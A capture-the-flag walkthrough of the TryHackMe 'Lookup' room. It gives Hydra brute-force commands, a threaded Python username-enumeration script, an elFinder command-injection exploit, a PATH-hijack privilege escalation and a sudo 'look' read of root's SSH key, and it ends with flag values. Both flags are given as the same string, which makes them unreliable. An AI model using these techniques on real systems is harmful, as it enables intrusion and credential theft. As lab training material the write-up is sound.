# TryHackMe: [Lookup](https://tryhackme.com/room/lookup)

![Lookup](https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1732205261742)

**Difficulty:** Easy
**Objectives:** User flag, Root flag

---

## 1. Setup

Add the machine to your `/etc/hosts`:

```bash
echo "MACHINE_IP lookup.thm" | sudo tee -a /etc/hosts
```

Or manually using `nano`:

```bash
sudo nano /etc/hosts
MACHINE_IP lookup.thm
```

---

## 2. Initial Enumeration

Run an Nmap scan:

```bash
nmap -sVC -A lookup.thm -oN nmap.txt
```

**Findings:**

* **22/tcp:** SSH (OpenSSH 8.2p1)
* **80/tcp:** HTTP (Apache 2.4.41)

Visiting `http://lookup.thm` reveals a **login page**.

---

## 3. Web Brute Force

Test default credentials:

* `admin:admin`
* `admin:password`

These fail, but the error response:

```
Wrong password. Please try again.
```

indicates `admin` may be valid.

### Hydra Brute Force:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password"
```

✅ **Found:** `admin:password123`

It fails to login, hinting the username may not be correct.

### Brute Force Usernames:

```bash
hydra -L /usr/share/seclists/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password"
```
# Username Enumeration Script with Threading for Lookup (TryHackMe)

This Python script helps **brute-force enumerate valid usernames** on `http://lookup.thm/` during CTFs or lab environments. It uses **threading for speed** and detects valid usernames based on error message differences.

---

## Script

```python
import requests
import threading
from queue import Queue

# ----- CONFIG -----
url = "http://lookup.thm/"
wordlist = "/usr/share/seclists/Usernames/Names/names.txt"
num_threads = 20  # Adjust for system/target stability
fixed_password = "admin"
output_file = "valid_usernames.txt"
# proxies = {"http": "http://127.0.0.1:8080"}

# ------------------

def worker():
    session = requests.Session()
    # session.proxies.update(proxies)

    while not q.empty():
        username = q.get()
        data = {
            "username": username,
            "password": fixed_password
        }
        try:
            response = session.post(url, data=data, timeout=5)

            if "Wrong password" in response.text:
                print(f"[+] Valid username found: {username}")
                with lock:
                    with open(output_file, "a") as f:
                        f.write(username + "\\n")

            # Optionally print invalids for debugging
            # elif "Wrong username or password" in response.text:
            #     print(f"[-] Invalid username: {username}")

            elif "Redirecting" not in response.text:
                print(f"[?] Unexpected response for {username}")

        except requests.RequestException as e:
            print(f"[!] Request failed for {username}: {e}")

        q.task_done()

# ----- Load Usernames into Queue -----
q = Queue()
with open(wordlist, "r") as f:
    for line in f:
        username = line.strip()
        if username:
            q.put(username)

# ----- Lock for file writing -----
lock = threading.Lock()

# ----- Start Threads -----
threads = []
for _ in range(num_threads):
    t = threading.Thread(target=worker, daemon=True)
    threads.append(t)
    t.start()

# ----- Wait for all to complete -----
q.join()

print("[*] Enumeration completed. Check valid_usernames.txt for results.")

---
```

✅ **Found:** `jose:password123`

Login with these credentials redirects to:

```
files.lookup.thm
```
Add this to `/etc/hosts`.

---

## 4. Exploring File Manager

Accessing `http://files.lookup.thm` reveals a **web file manager**. We find:

* `credentials.txt` containing `think:nopassword` (confirming the user `think`).
* The file manager is **elFinder 2.1.47**.

---

## 5. Exploiting elFinder

Check exploits:

```bash
searchsploit elFinder 2.1.47
```

Using **Metasploit's exiftran command injection exploit**, we gain a **Meterpreter shell as www-data**.

---

## 6. Privilege Escalation to User

### Finding SUID Binaries:

```bash
find / -perm -4000 2>/dev/null
```

Identified:

```
/usr/sbin/pwm
```

### Analyzing pwm

It calls `id` and tries to read `/home/www-data/.passwords`.

### PATH Hijacking:

```bash
cd /tmp
echo -e '#!/bin/bash\necho "uid=33(think) gid=33(think) groups=33(think)"' > id
chmod +x id
export PATH=/tmp:$PATH
/usr/sbin/pwm
```

Now `pwm` thinks it is `think` and dumps passwords, saved to `passwords.txt`.

### Brute Forcing SSH:

```bash
hydra -l think -P passwords.txt ssh://lookup.thm
```

✅ Found credentials for `think`, log in via SSH, and grab the **user flag**.

---

## 7. Privilege Escalation to Root

Check sudo permissions:

```bash
sudo -l
```

We find `look` available.

Using **GTFOBins**:

```bash
sudo look '' /root/.ssh/id_rsa
```

We capture the **root SSH private key**, save it locally:

```bash
echo "<PASTE_KEY>" > id_rsa
chmod 600 id_rsa
```

Log in as root:

```bash
ssh -i id_rsa root@lookup.thm
```

✅ Grab the **root flag**.

---

## ✅ Room Completed

* User flag: 38375fb4dd8baa2b2039ac03d92b820e
* Root flag: 38375fb4dd8baa2b2039ac03d92b820e
